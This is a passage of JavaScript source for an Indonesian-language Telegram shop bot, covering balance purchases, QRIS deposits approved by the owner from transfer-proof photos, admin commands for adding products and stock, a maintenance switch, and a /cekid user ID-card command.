      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Deposit', callback_data: 'deposit_menu' },
              { text: '📋 Kembali', callback_data: `product_${productId}` }
            ]
          ]
        }
      });
    } else {
      await bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Deposit', callback_data: 'deposit_menu' },
              { text: '📋 Kembali', callback_data: `product_${productId}` }
            ]
          ]
        }
      });
    }
    return;
  }

  const orderId = `ORD-${Date.now().toString().slice(-8)}`;
  user.balance -= total;
  product.stock -= qty;

  productDB.orders[orderId] = {
    id: orderId,
    user_id: userId,
    product_id: productId,
    qty,
    total,
    created_at: new Date().toISOString()
  };
  saveData();
  saveProductData();

  const successText = `
<blockquote>✅ 𝗣𝗘𝗠𝗕𝗘𝗟𝗜𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟</blockquote>

🎉 <b>Terima kasih telah berbelanja!</b>
➥ <b>ID Order:</b> <code>${orderId}</code>
➥ <b>Produk:</b> ${product.name}
➥ <b>Jumlah:</b> ${qty} unit
➥ <b>Total:</b> <code>Rp ${total.toLocaleString('id-ID')}</code>
➥ <b>Sisa Saldo:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>

<code>────────────────────</code>
📦 <i>File produk sedang dikirim...</i>
  `;

  if (messageId) {
    await bot.editMessageText(successText, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🛍️ Beli Lagi', callback_data: 'lihat_produk' },
            { text: '💳 Deposit', callback_data: 'deposit_menu' }
          ]
        ]
      }
    });
  } else {
    await bot.sendMessage(chatId, successText, { 
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🛍️ Beli Lagi', callback_data: 'lihat_produk' },
            { text: '💳 Deposit', callback_data: 'deposit_menu' }
          ]
        ]
      }
    });
  }

  try {
    await bot.sendDocument(chatId, product.fileId, {
      caption: `
📦 <b>File Produk:</b> ${product.name}
✅ <b>Status:</b> Berhasil dikirim
🎯 <b>Selamat menikmati!</b>
      `,
      parse_mode: 'HTML'
    });
  } catch (error) {
    await bot.sendMessage(chatId, `
⚠️ <b>File sedang diproses</b>
➥ Admin akan mengirimkan file segera
➥ ID Order: <code>${orderId}</code>
    `, { parse_mode: 'HTML' });
  }

  await bot.sendMessage(OWNER_IDS[0], `
<blockquote>🛒 𝗣𝗘𝗠𝗕𝗘𝗟𝗜𝗔𝗡 𝗕𝗔𝗥𝗨</blockquote>
➥ <b>User:</b> ${userInfo.first_name}
➥ <b>Produk:</b> ${product.name}
➥ <b>Jumlah:</b> ${qty} unit
➥ <b>Total:</b> <code>Rp ${total.toLocaleString('id-ID')}</code>
➥ <b>ID Order:</b> <code>${orderId}</code>
➥ <b>Sisa Stok:</b> ${product.stock} unit
  `, { parse_mode: 'HTML' });
}

// === PROCESS DEPOSIT FUNCTION ===
async function processDeposit(chatId, userId, userInfo, amount) {
  if (!amount || isNaN(amount) || amount < PAYMENT_SETTINGS.MIN_DEPOSIT) {
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟 𝗧𝗜𝗗𝗔𝗞 𝗩𝗔𝗟𝗜𝗗</blockquote>
➥ Deposit: <code>Rp ${amount ? amount.toLocaleString('id-ID') : '0'}</code>
➥ Minimal: <code>Rp ${PAYMENT_SETTINGS.MIN_DEPOSIT.toLocaleString('id-ID')}</code>
    `, { parse_mode: 'HTML' });
  }

  const depositId = `DP-${Date.now().toString().slice(-8)}`;
  const fee = calculateAdminFee(amount);
  const total = calculateTotalAmount(amount);

  productDB.deposits[depositId] = {
    id: depositId,
    user_id: userId,
    amount: amount,
    admin_fee: fee,
    total_amount: total,
    status: 'pending',
    created_at: new Date().toISOString(),
    proof: null
  };
  saveProductData();

  if (depositSessions[userId]) {
    delete depositSessions[userId].waitingForCustomAmount;
  }

  depositSessions[userId] = { 
    depositId, 
    amount: amount, 
    total: total,
    timer: null 
  };

  const caption = `
<blockquote>💎 𝗜𝗡𝗦𝗧𝗥𝗨𝗞𝗦𝗜 𝗗𝗘𝗣𝗢𝗦𝗜𝗧</blockquote>

✧ <b>Detail Deposit</b> ✧
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Jumlah:</b> <code>Rp ${amount.toLocaleString('id-ID')}</code>
➥ <b>Biaya Admin:</b> <code>Rp ${fee.toLocaleString('id-ID')}</code>
➥ <b>Total Transfer:</b> <code>Rp ${total.toLocaleString('id-ID')}</code>

<blockquote>📤 Kirim bukti transfer ke sini
⏳ Batas waktu 5 menit</blockquote>`;

  const message = await bot.sendPhoto(chatId, PAYMENT_SETTINGS.QRIS_DATA.image_url, {
    caption,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '🔄 Cek Status', callback_data: `check_deposit_${depositId}` },
          { text: '❌ Batalkan', callback_data: `cancel_deposit_${depositId}` }
        ],
        [
          { text: '💳 Cek Saldo', callback_data: 'cek_saldo' },
          { text: '🛍️ Lihat Produk', callback_data: 'lihat_produk' }
        ]
      ]
    }
  });

  await bot.sendMessage(OWNER_IDS[0], `
<blockquote>📥 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗕𝗔𝗥𝗨</blockquote>
➥ <b>User:</b> <a href="tg://user?id=${userId}">${userInfo.first_name}</a>
➥ <b>Jumlah:</b> <code>Rp ${amount.toLocaleString('id-ID')}</code>
➥ <b>Total:</b> <code>Rp ${total.toLocaleString('id-ID')}</code>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Status:</b> Menunggu Bukti Transfer
  `, { parse_mode: 'HTML' });

  const timeout = setTimeout(async () => {
    const dep = productDB.deposits[depositId];
    if (dep && dep.status === 'pending') {
      dep.status = 'expired';
      saveProductData();
      
      if (depositSessions[userId]) {
        delete depositSessions[userId];
      }

      await bot.sendMessage(chatId, `
<blockquote>⏰ 𝗪𝗔𝗞𝗧𝗨 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗛𝗔𝗕𝗜𝗦</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Status:</b> Expired - Silakan ulangi deposit
      `, { parse_mode: 'HTML' });

      try {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
          chat_id: chatId,
          message_id: message.message_id
        });
      } catch (error) {}
    }
  }, 5 * 60 * 1000);

  depositSessions[userId].timer = timeout;
}

// === CALLBACK QUERY HANDLER ===
bot.on('callback_query', async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const userId = query.from.id.toString();
  const messageId = query.message.message_id;

  try {
    if (data.startsWith('deposit_')) {
      await bot.answerCallbackQuery(query.id);
      
      if (data === 'deposit_custom') {
        depositSessions[userId] = { waitingForCustomAmount: true };
        
        const text = `
<blockquote>📝 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗖𝗨𝗦𝗧𝗢𝗠</blockquote>
➥ <b>Kirim nominal deposit:</b>
➥ <b>Contoh:</b> <code>75000</code>

<code>────────────────────</code>
💠 <b>Minimal:</b> Rp ${PAYMENT_SETTINGS.MIN_DEPOSIT.toLocaleString('id-ID')}

⚠️ <b>Note:</b> Hanya kirim angka saja, tanpa titik/koma
        `;

        await bot.editMessageText(text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '↩️ Kembali', callback_data: 'deposit_menu' }]
            ]
          }
        });
        return;
      }

      const amountStr = data.split('_')[1];
      const amount = parseInt(amountStr);
      
      if (!isNaN(amount) && amount >= PAYMENT_SETTINGS.MIN_DEPOSIT) {
        await processDeposit(chatId, userId, query.from, amount);
      } else {
        const text = `
<blockquote>⚠️ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟 𝗧𝗜𝗗𝗔𝗞 𝗩𝗔𝗟𝗜𝗗</blockquote>
➥ <b>Nominal:</b> ${amountStr}
➥ <b>Status:</b> Silakan pilih nominal lain
        `;

        await bot.editMessageText(text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '↩️ Kembali', callback_data: 'deposit_menu' }]
            ]
          }
        });
      }
      return;
    }

    if (data.startsWith('product_')) {
      await bot.answerCallbackQuery(query.id);
      const productId = data.split('_')[1];
      await showProductDetail(chatId, userId, productId, messageId);
      return;
    }

    if (data.startsWith('buy_')) {
      await bot.answerCallbackQuery(query.id);
      const [_, productId, qty] = data.split('_');
      await processBuy(chatId, userId, productId, parseInt(qty), query.from, messageId);
      return;
    }

    if (data === 'cek_saldo') {
      await bot.answerCallbackQuery(query.id);
      const user = initializeUser(userId, query.from);
      const text = `
<blockquote>💳 𝗜𝗡𝗙𝗢 𝗦𝗔𝗟𝗗𝗢</blockquote>

👤 <b>User:</b> ${query.from.first_name}
💰 <b>Saldo:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>
📅 <b>Update:</b> ${new Date().toLocaleString('id-ID')}

<code>────────────────────</code>
💎 <i>Saldo dapat digunakan untuk membeli produk</i>
      `;

      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Deposit', callback_data: 'deposit_menu' },
              { text: '🛍️ Beli Produk', callback_data: 'lihat_produk' }
            ],
            [
              { text: '🔄 Refresh', callback_data: 'refresh_saldo' }
            ]
          ]
        }
      });
      return;
    }

    if (data === 'refresh_saldo') {
      await bot.answerCallbackQuery(query.id, { text: 'Saldo diperbarui!' });
      const user = initializeUser(userId, query.from);
      const text = `
<blockquote>💳 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗦𝗔𝗟𝗗𝗢</blockquote>

👤 <b>User:</b> ${query.from.first_name}
💰 <b>Saldo:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>
📅 <b>Update:</b> ${new Date().toLocaleString('id-ID')}

<code>────────────────────</code>
💎 <i>Saldo dapat digunakan untuk membeli produk</i>
      `;

      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Deposit', callback_data: 'deposit_menu' },
              { text: '🛍️ Beli Produk', callback_data: 'lihat_produk' }
            ],
            [
              { text: '🔄 Refresh', callback_data: 'refresh_saldo' }
            ]
          ]
        }
      });
      return;
    }

    if (data === 'kembali_list' || data === 'lihat_produk') {
      await bot.answerCallbackQuery(query.id);
      await showStockList(chatId, messageId, query.from);
      return;
    }

    if (data === 'deposit_menu') {
      await bot.answerCallbackQuery(query.id);
      
      const text = `
<blockquote>💳 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗦𝗘𝗞𝗔𝗥𝗔𝗡𝗚</blockquote>

💰 <b>Pilih Nominal Deposit:</b>
➥ Deposit cepat dengan nominal yang tersedia

<code>────────────────────</code>
💠 <b>Minimal Deposit:</b> Rp ${PAYMENT_SETTINGS.MIN_DEPOSIT.toLocaleString('id-ID')}
      `;

      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💰 10K', callback_data: 'deposit_10000' },
              { text: '💰 25K', callback_data: 'deposit_25000' },
              { text: '💰 50K', callback_data: 'deposit_50000' }
            ],
            [
              { text: '💰 100K', callback_data: 'deposit_100000' },
              { text: '💰 250K', callback_data: 'deposit_250000' },
              { text: '💰 500K', callback_data: 'deposit_500000' }
            ],
            [
              { text: '📝 Custom Amount', callback_data: 'deposit_custom' }
            ],
            [
              { text: '💳 Cek Saldo', callback_data: 'cek_saldo' },
              { text: '🛍️ Lihat Produk', callback_data: 'lihat_produk' }
            ]
          ]
        }
      });
      return;
    }

    if (data === 'refresh_stock') {
      await bot.answerCallbackQuery(query.id, { text: 'Stok diperbarui!' });
      await showStockList(chatId, messageId, query.from);
      return;
    }

    if (data === 'stok_habis') {
      return await bot.answerCallbackQuery(query.id, {
        text: '❌ Stok produk sudah habis',
        show_alert: true
      });
    }

    if (data.startsWith('check_deposit_')) {
      const depositId = data.split('_')[2];
      const deposit = productDB.deposits[depositId];
      if (!deposit) {
        return await bot.answerCallbackQuery(query.id, {
          text: 'Deposit tidak ditemukan',
          show_alert: true
        });
      }
      return await bot.answerCallbackQuery(query.id, {
        text: `Status: ${deposit.status.toUpperCase()}`,
        show_alert: true
      });
    }

    if (data.startsWith('cancel_deposit_')) {
      const depositId = data.split('_')[2];
      const deposit = productDB.deposits[depositId];
      
      if (!deposit) {
        return await bot.answerCallbackQuery(query.id, {
          text: 'Deposit tidak ditemukan',
          show_alert: true
        });
      }

      if (deposit.status !== 'pending') {
        return await bot.answerCallbackQuery(query.id, {
          text: 'Deposit sudah diproses',
          show_alert: true
        });
      }

      deposit.status = 'cancelled';
      saveProductData();

      if (depositSessions[userId] && depositSessions[userId].timer) {
        clearTimeout(depositSessions[userId].timer);
      }
      delete depositSessions[userId];

      await bot.answerCallbackQuery(query.id, { text: 'Deposit dibatalkan' });
      
      const text = `
<blockquote>❌ 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗗𝗜𝗕𝗔𝗧𝗔𝗟𝗞𝗔𝗡</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Status:</b> Dibatalkan oleh user
      `;

      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Deposit Lagi', callback_data: 'deposit_menu' },
              { text: '🛍️ Lihat Produk', callback_data: 'lihat_produk' }
            ]
          ]
        }
      });
    }

    if (data.startsWith('approve_deposit_') || data.startsWith('reject_deposit_')) {
      const depositId = data.split('_')[2];
      const deposit = productDB.deposits[depositId];
      
      if (!deposit) {
        return await bot.answerCallbackQuery(query.id, {
          text: 'Deposit tidak ditemukan',
          show_alert: true
        });
      }

      const userId = deposit.user_id;
      const ownerId = query.from.id.toString();

      if (!isAnyOwner(ownerId)) {
        return await bot.answerCallbackQuery(query.id, {
          text: 'Hanya owner yang bisa konfirmasi',
          show_alert: true
        });
      }

      if (data.startsWith('approve')) {
        deposit.status = 'approved';
        const user = initializeUser(userId);
        user.balance += deposit.amount;
        saveProductData();
        saveData();

        await bot.answerCallbackQuery(query.id, { text: 'Deposit disetujui!' });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
          chat_id: chatId,
          message_id: query.message.message_id
        });

        await bot.sendMessage(userId, `
<blockquote>🎉 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗗𝗜𝗦𝗘𝗧𝗨𝗝𝗨𝗜</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Jumlah:</b> <code>Rp ${deposit.amount.toLocaleString('id-ID')}</code>
➥ <b>Status:</b> Saldo berhasil ditambahkan 💎
➥ <b>Saldo Sekarang:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>

<code>────────────────────</code>
🛍️ <i>Silakan gunakan saldo untuk membeli produk</i>
        `, { parse_mode: 'HTML' });

      } else {
        deposit.status = 'rejected';
        saveProductData();

        await bot.answerCallbackQuery(query.id, { text: 'Deposit ditolak!' });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
          chat_id: chatId,
          message_id: query.message.message_id
        });

        await bot.sendMessage(userId, `
<blockquote>❌ 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗗𝗜𝗧𝗢𝗟𝗔𝗞</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Status:</b> Deposit kamu ditolak oleh admin
➥ <b>Alasan:</b> Bukti transfer tidak valid

<code>────────────────────</code>
💡 <i>Hubungi admin untuk informasi lebih lanjut</i>
        `, { parse_mode: 'HTML' });
      }
    }

  } catch (error) {
    console.error('Callback error:', error);
    await bot.answerCallbackQuery(query.id, {
      text: 'Terjadi error, coba lagi',
      show_alert: true
    });
  }
});

// === HANDLE CUSTOM DEPOSIT AMOUNT ===
bot.on('message', async (msg) => {
  if (!msg.text || msg.text.startsWith('/')) return;
  
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (depositSessions[userId] && depositSessions[userId].waitingForCustomAmount) {
    const amount = parseInt(msg.text.replace(/[^\d]/g, ''));
    
    if (!isNaN(amount) && amount >= PAYMENT_SETTINGS.MIN_DEPOSIT) {
      await processDeposit(chatId, userId, msg.from, amount);
    } else {
      await bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟 𝗧𝗜𝗗𝗔𝗞 𝗩𝗔𝗟𝗜𝗗</blockquote>
➥ <b>Input:</b> ${msg.text}
➥ <b>Minimal:</b> Rp ${PAYMENT_SETTINGS.MIN_DEPOSIT.toLocaleString('id-ID')}

<code>────────────────────</code>
💡 <b>Contoh input yang benar:</b>
• <code>75000</code> (tanpa titik/koma)
• <code>100000</code> (langsung angka)
      `, { parse_mode: 'HTML' });
    }
    
    delete depositSessions[userId].waitingForCustomAmount;
  }
});

// === HANDLE BUKTI TRANSFER PHOTO ===
bot.on('photo', async (msg) => {
  const userId = msg.from.id.toString();
  
  const userSession = depositSessions[userId];
  if (!userSession || !userSession.depositId) return;

  const depositId = userSession.depositId;
  const deposit = productDB.deposits[depositId];
  
  if (!deposit || deposit.status !== 'pending') return;

  if (userSession.timer) {
    clearTimeout(userSession.timer);
  }

  const fileId = msg.photo[msg.photo.length - 1].file_id;
  deposit.proof = fileId;
  deposit.status = 'review';
  saveProductData();

  await bot.sendMessage(msg.chat.id, `
<blockquote>✅ 𝗕𝗨𝗞𝗧𝗜 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗗𝗜𝗧𝗘𝗥𝗜𝗠𝗔</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>Status:</b> Menunggu konfirmasi admin...
➥ <b>Estimasi:</b> 1-5 menit
  `, { parse_mode: 'HTML' });

  await bot.sendPhoto(OWNER_IDS[0], fileId, {
    caption: `
<blockquote>📩 𝗞𝗢𝗡𝗙𝗜𝗥𝗠𝗔𝗦𝗜 𝗗𝗘𝗣𝗢𝗦𝗜𝗧</blockquote>
➥ <b>ID:</b> <code>${depositId}</code>
➥ <b>User:</b> <a href="tg://user?id=${userId}">${msg.from.first_name}</a>
➥ <b>Jumlah:</b> <code>Rp ${deposit.amount.toLocaleString('id-ID')}</code>
➥ <b>Total:</b> <code>Rp ${deposit.total_amount.toLocaleString('id-ID')}</code>
➥ <b>Status:</b> Menunggu Konfirmasi
    `,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `approve_deposit_${depositId}` },
          { text: '❌ Reject', callback_data: `reject_deposit_${depositId}` }
        ]
      ]
    }
  });

  delete depositSessions[userId];
});

// === HANDLE ADDPRODUCT WITH DETAILS ===
bot.onText(/^\/addproduct/, async (msg) => {
  if (!(await cekAkses("utama", msg))) return;
  
  const lines = msg.text.split('\n').slice(1);
  const details = {};
  
  for (const line of lines) {
    const [key, ...val] = line.split(':');
    if (key && val.length) {
      details[key.trim().toLowerCase()] = val.join(':').trim();
    }
  }

  if (!details.nama || !details.id) {
    return bot.sendMessage(msg.chat.id, `
<blockquote>⚙️ 𝗙𝗢𝗥𝗠𝗔𝗧 𝗦𝗔𝗟𝗔𝗛</blockquote>
➥ <b>Gunakan format:</b>
<code>/addproduct
Nama: Contoh Produk
ID: contoh
Deskripsi: Deskripsi produk (opsional)</code>
    `, { parse_mode: 'HTML' });
  }

  const id = details.id.toLowerCase();
  if (productDB.products[id]) {
    return bot.sendMessage(msg.chat.id, `
<blockquote>⚠️ 𝗣𝗥𝗢𝗗𝗨𝗞 𝗦𝗨𝗗𝗔𝗛 𝗔𝗗𝗔</blockquote>
➥ <b>ID:</b> <code>${id}</code>
➥ <b>Status:</b> Produk dengan ID ini sudah ada
    `, { parse_mode: 'HTML' });
  }

  productDB.products[id] = {
    id,
    name: details.nama,
    description: details.deskripsi || 'Tidak ada deskripsi',
    price: 0,
    stock: 0,
    fileId: null,
    created_at: new Date().toISOString()
  };
  saveProductData();

  await bot.sendMessage(msg.chat.id, `
<blockquote>✅ 𝗣𝗥𝗢𝗗𝗨𝗞 𝗕𝗔𝗥𝗨 𝗗𝗜𝗧𝗔𝗠𝗕𝗔𝗛𝗞𝗔𝗡</blockquote>

🏷️ <b>Nama:</b> ${details.nama}
🆔 <b>ID:</b> <code>${id}</code>
📝 <b>Deskripsi:</b> ${details.deskripsi || 'Tidak ada deskripsi'}

<code>────────────────────</code>
📦 <b>Status:</b> Gunakan <code>/addstock</code> untuk menambah harga & stok
  `, { parse_mode: 'HTML' });
});

// === HANDLE ADDSTOCK WITH REPLY ===
bot.onText(/^\/addstock(?:\s+(.+))?/, async (msg, match) => {
  if (!(await cekAkses("utama", msg))) return;
  
  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  const productId = args[0]?.toLowerCase();
  const price = parseInt(args[1]);
  const stock = parseInt(args[2]);
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(msg.chat.id, `
<blockquote>📁 𝗙𝗜𝗟𝗘 𝗗𝗜𝗕𝗨𝗧𝗨𝗛𝗞𝗔𝗡</blockquote>
➥ <b>Status:</b> Reply ke file produk terlebih dahulu!
➥ <b>Format:</b> <code>/addstock [id] [harga] [stok]</code>
    `, { parse_mode: 'HTML' });
  }

  if (!productId || isNaN(price) || isNaN(stock)) {
    return bot.sendMessage(msg.chat.id, `
<blockquote>⚠️ 𝗙𝗢𝗥𝗠𝗔𝗧 𝗦𝗔𝗟𝗔𝗛</blockquote>
➥ <b>Format:</b> <code>/addstock [id] [harga] [stok]</code>
➥ <b>Contoh:</b> <code>/addstock vip1 50000 10</code>
    `, { parse_mode: 'HTML' });
  }

  const product = productDB.products[productId];
  if (!product) {
    return bot.sendMessage(msg.chat.id, `
<blockquote>❌ 𝗣𝗥𝗢𝗗𝗨𝗞 𝗧𝗜𝗗𝗔𝗞 𝗗𝗜𝗧𝗘𝗠𝗨𝗞𝗔𝗡</blockquote>
➥ <b>ID:</b> <code>${productId}</code>
➥ <b>Status:</b> Buat produk dulu dengan /addproduct
    `, { parse_mode: 'HTML' });
  }

  const file = reply.document;
  product.price = price;
  product.stock += stock;
  product.fileId = file.file_id;
  saveProductData();

  await bot.sendMessage(msg.chat.id, `
<blockquote>✅ 𝗦𝗧𝗢𝗞 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗗𝗜𝗧𝗔𝗠𝗕𝗔𝗛</blockquote>

🏷️ <b>Produk:</b> ${product.name}
🆔 <b>ID:</b> <code>${productId}</code>
💰 <b>Harga:</b> <code>Rp ${price.toLocaleString('id-ID')}</code>
📦 <b>Stok Ditambah:</b> +${stock} unit
📊 <b>Stok Sekarang:</b> ${product.stock} unit

<code>────────────────────</code>
🎯 <b>Status:</b> Produk sudah ready untuk dijual!
  `, { parse_mode: 'HTML' });
});

// === /setmaintenance ===
bot.onText(/^\/setmaintenance(?:\s+(on|off))?$/, async (msg, match) => {
  if (!(await cekAkses("utama", msg))) return;

  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;

  const arg = match[1];
  if (!arg) {
    const status = isMaintenance() ? "🔴 ON (Aktif)" : "🟢 OFF (Nonaktif)";
    return bot.sendMessage(chatId, `
<blockquote>⚙️ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲</blockquote>
➥ <b>Status Saat Ini:</b> ${status}`, { parse_mode: "HTML" });
  }

  if (arg.toLowerCase() === "on") {
    setMaintenance(true);
    return bot.sendMessage(chatId, `
<blockquote>🔴 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗔𝗸𝘁𝗶𝗳</blockquote>
➥ <b>Status:</b> Mode maintenance telah AKTIF
➥ <b>Keterangan:</b> Semua user akan menerima notifikasi dan tidak bisa menggunakan bot`, { parse_mode: "HTML" });
  } else if (arg.toLowerCase() === "off") {
    setMaintenance(false);
    return bot.sendMessage(chatId, `
<blockquote>🟢 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗡𝗼𝗻𝗮𝗸𝘁𝗶𝗳</blockquote>
➥ <b>Status:</b> Mode maintenance telah DINONAKTIFKAN
➥ <b>Keterangan:</b> Bot kembali normal digunakan`, { parse_mode: "HTML" });
  } else {
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan:</b> <code>/setmaintenance on</code> atau <code>/setmaintenance off</code>`, { parse_mode: "HTML" });
  }
});

// === /cekid ===
const { createCanvas } = require('canvas');

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const firstName = msg.from.first_name || 'No Name';
  const lastName = msg.from.last_name || '';
  const fullName = lastName ? `${firstName} ${lastName}` : firstName;
  const username = msg.from.username ? '@' + msg.from.username : 'No Username';
  const languageCode = msg.from.language_code || 'Not detected';
  
  const now = new Date();
  const date = now.toLocaleDateString("id-ID", { 
    timeZone: "Asia/Jakarta",
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  const time = now.toLocaleTimeString("id-ID", {
    timeZone: "Asia/Jakarta",
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // Calculate DC ID
  const dcId = (userId >> 22) % 4;

  const data = loadData();
  const isPremiumUser = data.premium && data.premium[userId.toString()] && Math.floor(Date.now() / 1000) < data.premium[userId.toString()];
  const premiumStatus = isPremiumUser ? "🟢 Active" : "🔴 Inactive";

  let hasPhoto = false;
  let photoCount = 0;
  
  try {
    const userProfilePhotos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    hasPhoto = userProfilePhotos.total_count > 0;
    photoCount = userProfilePhotos.total_count;
  } catch (err) {
    hasPhoto = false;
    console.error("Error getting profile photos:", err);
  }

  try {
    const canvas = createCanvas(500, 300);
    const ctx = canvas.getContext('2d');
    
    ctx.fillStyle = '#0a1929';
    ctx.fillRect(0, 0, 500, 300);

    ctx.strokeStyle = '#00ff88';
    ctx.lineWidth = 4;
    ctx.strokeRect(10, 10, 480, 280);

    ctx.fillStyle = '#00ff88';
    ctx.font = 'bold 22px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('TELEGRAM ID CARD', 250, 45);

    ctx.strokeStyle = '#00ff88';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(30, 65);
    ctx.lineTo(470, 65);
    ctx.stroke();

    ctx.fillStyle = '#ffffff';
    ctx.font = '16px Arial';
    ctx.textAlign = 'left';
    ctx.fillText(`Name: ${fullName}`, 30, 95);
    ctx.fillText(`ID: ${userId}`, 30, 125);
    ctx.fillText(`User: ${username}`, 30, 155);
    ctx.fillText(`DC: ${dcId}`, 30, 185);
    ctx.fillText(`Lang: ${getLanguageName(languageCode)}`, 30, 215);

    ctx.fillStyle = '#00ff88';
    ctx.font = '12px Arial';
    ctx.textAlign = 'center';
    ctx.fillText(`Created by ${DEVELOPER}`, 250, 260);
    ctx.fillText(`${date}`, 250, 280);

    const buffer = canvas.toBuffer('image/png');

    const caption = `<blockquote>🪪 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗜𝗗 𝗖𝗔𝗥𝗗</blockquote>

👤 <b>User Information</b>
├ <b>User ID:</b> <code>${userId}</code>
├ <b>Name:</b> <a href="tg://user?id=${userId}">${fullName}</a>
├ <b>Username:</b> ${username}
├ <b>DC ID:</b> ${dcId}
└ <b>Language:</b> ${getLanguageName(languageCode)}

📊 <b>Profile Status</b>
├ <b>Profile Photo:</b> ${hasPhoto ? `🟢 Yes (${photoCount})` : '🔴 No'}
├ <b>Scam Account:</b> ${msg.from.is_scam ? '🔴 Yes' : '🟢 No'}
├ <b>Fake Account:</b> ${msg.from.is_fake ? '🔴 Yes' : '🟢 No'}
├ <b>Telegram Premium:</b> ${msg.from.is_premium ? '🟢 Yes' : '🔴 No'}
└ <b>Verified Account:</b> ${msg.from.is_verified ? '🟢 Yes' : '🔴 No'}

🤖 <b>Bot Status</b>
├ <b>Premium Access:</b> ${premiumStatus}
├ <b>Blacklisted:</b> ${data.blacklist && data.blacklist.includes(userId.toString()) ? '🔴 Yes' : '🟢 No'}
├ <b>Groups Added:</b> ${data.user_group_count && data.user_group_count[userId.toString()] ? data.user_group_count[userId.toString()] : 0}
└ <b>Registered User:</b> ${data.users && data.users.includes(userId.toString()) ? '🟢 Yes' : '🔴 No'}

📅 <b>Check Information</b>
├ <b>Check Date:</b> ${date}
├ <b>Check Time:</b> ${time}
└ <b>Chat Type:</b> ${msg.chat.type.charAt(0).toUpperCase() + msg.chat.type.slice(1)}

<blockquote>Generated by @${DEVELOPER}</blockquote>
    `;

    await bot.sendPhoto(chatId, buffer, {
      caption: caption,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: `👤 ${firstName}`, 
              url: `tg://user?id=${userId}` 
            }
          ],
          [
            { 
              text: "🔄 Refresh", 
              callback_data: `refresh_cekid_${userId}` 
            }
          ]
        ]
      }
    });

  } catch (err) {
    console.error("❌ Error di /cekid:", err);
    
    const fallbackText = `
